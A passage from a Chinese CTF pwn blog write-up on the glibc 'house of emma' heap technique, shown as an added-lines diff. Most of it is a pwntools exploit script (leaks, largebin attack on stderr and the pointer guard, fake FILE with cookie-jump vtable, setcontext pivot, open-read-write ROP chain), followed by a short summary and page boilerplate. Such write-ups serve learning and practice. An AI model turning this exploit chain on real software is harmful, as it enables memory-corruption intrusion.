class="hljs-comment">#: pop rdx; pop r12; ret;</span><br>pop_rax_addr = libc_base + <span class="hljs-number">0x00000000000446c0</span> <span class="hljs-comment">#: pop rax; ret;</span><br>syscall_addr = libc_base + <span class="hljs-number">0x00000000000883b6</span> <span class="hljs-comment">#: syscall; ret;</span><br>setcontext_addr = libc_base + libc.sym[<span class="hljs-string">&quot;setcontext&quot;</span>]<br>stderr = libc_base + libc.sym[<span class="hljs-string">&quot;stderr&quot;</span>]<br>open_addr = libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]+libc_base<br>read_addr = libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]+libc_base<br>write_addr = libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]+libc_base<br><br><br><br><span class="hljs-comment">#suc(&quot;guard&quot;,guard)</span><br>_IO_cookie_jumps = libc_base + <span class="hljs-number">0x1f3ae0</span> <br><br>edit(<span class="hljs-number">2</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>show(<span class="hljs-number">2</span>)<br><span class="hljs-comment">#gdb.attach(io)</span><br>run()<br>io.recvuntil(<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0x10</span>)<br>heap_base = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) -<span class="hljs-number">0x2ae0</span> <br>suc(<span class="hljs-string">&quot;heap_base&quot;</span>,heap_base)<br>guard = libc_base+ <span class="hljs-number">0x20d770</span><br>suc(<span class="hljs-string">&quot;guard&quot;</span>,guard)<br><br>free(<span class="hljs-number">0</span>)<br>payload = p64(libc_base + <span class="hljs-number">0x1f30b0</span>)*<span class="hljs-number">2</span> + p64(heap_base +<span class="hljs-number">0x2ae0</span>) + p64(stderr - <span class="hljs-number">0x20</span>)<br>edit(<span class="hljs-number">2</span>,payload)<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x430</span>)<br>edit(<span class="hljs-number">2</span>,p64(heap_base + <span class="hljs-number">0x22a0</span>) + p64(libc_base + <span class="hljs-number">0x1f30b0</span>) + p64(heap_base + <span class="hljs-number">0x22a0</span>) * <span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">0</span>, p64(libc_base + <span class="hljs-number">0x1f30b0</span>) + p64(heap_base + <span class="hljs-number">0x2ae0</span>) * <span class="hljs-number">3</span>)<br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x410</span>)<br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x420</span>)<br>run()<br><br>free(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x430</span>)<br>free(<span class="hljs-number">0</span>)<br>edit(<span class="hljs-number">2</span>, p64(libc_base + <span class="hljs-number">0x1f30b0</span>) * <span class="hljs-number">2</span> + p64(heap_base + <span class="hljs-number">0x2ae0</span>) + p64(guard - <span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">7</span>, <span class="hljs-number">0x450</span>)<br>edit(<span class="hljs-number">2</span>, p64(heap_base + <span class="hljs-number">0x22a0</span>) + p64(libc_base + <span class="hljs-number">0x1f30b0</span>) + p64(heap_base + <span class="hljs-number">0x22a0</span>) * <span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">0</span>, p64(libc_base + <span class="hljs-number">0x1f30b0</span>) + p64(heap_base + <span class="hljs-number">0x2ae0</span>) * <span class="hljs-number">3</span>)<br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x420</span>)<br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x410</span>)<br><br><br><span class="hljs-comment">#gdb.attach(io)</span><br>run()<br>free(<span class="hljs-number">7</span>)<br>add(<span class="hljs-number">8</span>, <span class="hljs-number">0x430</span>)<br>edit(<span class="hljs-number">7</span>,<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x438</span> + p64(<span class="hljs-number">0x300</span>))<br>run()<br><br><br><br>flag = heap_base + <span class="hljs-number">0x22a0</span> + <span class="hljs-number">0x260</span><br><br>orw =p64(pop_rdi_addr)+p64(flag)<br>orw+=p64(pop_rsi_addr)+p64(<span class="hljs-number">0</span>)<br>orw+=p64(pop_rax_addr)+p64(<span class="hljs-number">2</span>)<br>orw+=p64(syscall_addr)<br><br><br>orw+=p64(pop_rdi_addr)+p64(<span class="hljs-number">3</span>)<br>orw+=p64(pop_rsi_addr)+p64(heap_base+<span class="hljs-number">0x1050</span>)     <span class="hljs-comment"># 从地址 读出flag</span><br>orw+=p64(pop_rdx_r12)+p64(<span class="hljs-number">0x30</span>)+p64(<span class="hljs-number">0</span>)<br>orw+=p64(read_addr)<br><br><br>orw+=p64(pop_rdi_addr)+p64(<span class="hljs-number">1</span>)<br>orw+=p64(pop_rsi_addr)+p64(heap_base+<span class="hljs-number">0x1050</span>)     <span class="hljs-comment"># 从地址 读出flag</span><br>orw+=p64(pop_rdx_r12)+p64(<span class="hljs-number">0x30</span>)+p64(<span class="hljs-number">0</span>)<br>orw+=p64(write_addr)<br><br><br><br><br>gadget = libc_base + <span class="hljs-number">0x146020</span>  <span class="hljs-comment"># mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];</span><br>chunk0 = heap_base + <span class="hljs-number">0x22a0</span><br>xor_key = chunk0<br>suc(<span class="hljs-string">&quot;xor_key&quot;</span>,xor_key)<br><br>fake_io = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># IO_read_end IO_read_base</span><br>fake_io += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># IO_write_base IO_write_ptr IO_write_end</span><br>fake_io += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># IO_buf_base IO_buf_end</span><br>fake_io += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">8</span> <span class="hljs-comment">#_IO_save_base ~ _codecvt</span><br>fake_io += p64(heap_base) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>  <span class="hljs-comment">#_lock   _offset  _codecvt</span><br>fake_io = fake_io.ljust(<span class="hljs-number">0xc8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br>fake_io += p64(_IO_cookie_jumps+<span class="hljs-number">0x38</span>) <span class="hljs-comment">#vtable</span><br>rdi_data = chunk0 + <span class="hljs-number">0xf0</span><br>rdx_data = chunk0 + <span class="hljs-number">0xf0</span><br><br><br>encrypt_gadget = rotate_left_64(gadget^xor_key,<span class="hljs-number">0x11</span>)<br>fake_io += p64(rdi_data)<br>fake_io += p64(encrypt_gadget)<br>fake_io += p64(<span class="hljs-number">0</span>) + p64(rdx_data)<br>fake_io += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> + p64(setcontext_addr + <span class="hljs-number">61</span>)<br>fake_io += p64(<span class="hljs-number">0xdeadbeef</span>)<br>fake_io += <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0xa0</span> - <span class="hljs-number">0x30</span>)<br>fake_io += p64(chunk0+<span class="hljs-number">0x1a0</span>)+p64(pop_rdi_addr+<span class="hljs-number">1</span>)<br>fake_io += orw<br>fake_io += p64(<span class="hljs-number">0xdeadbeef</span>)<br>fake_io += <span class="hljs-string">b&#x27;flag\x00\x00\x00\x00&#x27;</span><br>edit(<span class="hljs-number">0</span>,fake_io)<br>run()<br><br>add(<span class="hljs-number">9</span>,<span class="hljs-number">0x4c0</span>)<br>gdb.attach(io)<br>run()<br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+<p><strong>gdaget call rax</strong></p>
+<p><img src="/2024/09/13/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-emma/3419447-20240913144050249-222088011.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><strong>call setcontext +61</strong></p>
+<p><img src="/2024/09/13/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-emma/3419447-20240913144159525-165967660.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><strong>实现迁移</strong></p>
+<p><img src="/2024/09/13/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-emma/3419447-20240913144241621-1184910082.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><strong>最终效果</strong></p>
+<p><img src="/2024/09/13/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-emma/3419447-20240913144310643-1290084998.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a><strong>总结：</strong></h3><p><strong>我个人感觉这个威力还是不小的，但是打远程的话需要爆破tls地址这个比较麻烦，无论是house_of_kiwi还是house_of_emma都是利用了__malloc_assest，但是遗憾的是，这个函数在后来的libc中，不能处理IO了，最后甚至去掉了，但是在这之前的版本还是可以利用的。</strong></p>
+<p><strong>最后这个题目的附件在NSSCTF平台上面有，有兴趣的师傅可以试一下。</strong></p>
+<p><strong>The best way to predict the future is to create it.</strong></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/PWN/" class="print-no-link">#PWN</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>常回家看看之house_of_emma</div>
+      <div>https://ch13hh.github.io/2024/09/13/常回家看看之house-of-emma/</div>
+    </div>
+    <div class="license-meta">
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年9月13日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/10/10/house-of-muney-CISCN/" title="house_of_muney[CISCN]">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">house_of_muney[CISCN]</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/09/10/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-kiwi/" title="常回家看看之house_of_kiwi">
+                        <span class="hidden-mobile">常回家看看之house_of_kiwi</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"AWdKxtM41CcPxu2EZoBdWpas-gzGzoHsz","appKey":"idRJngxDPrsuLA4G1dKyEewP","path":"window.location.pathname","placeholder":"说点什么","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
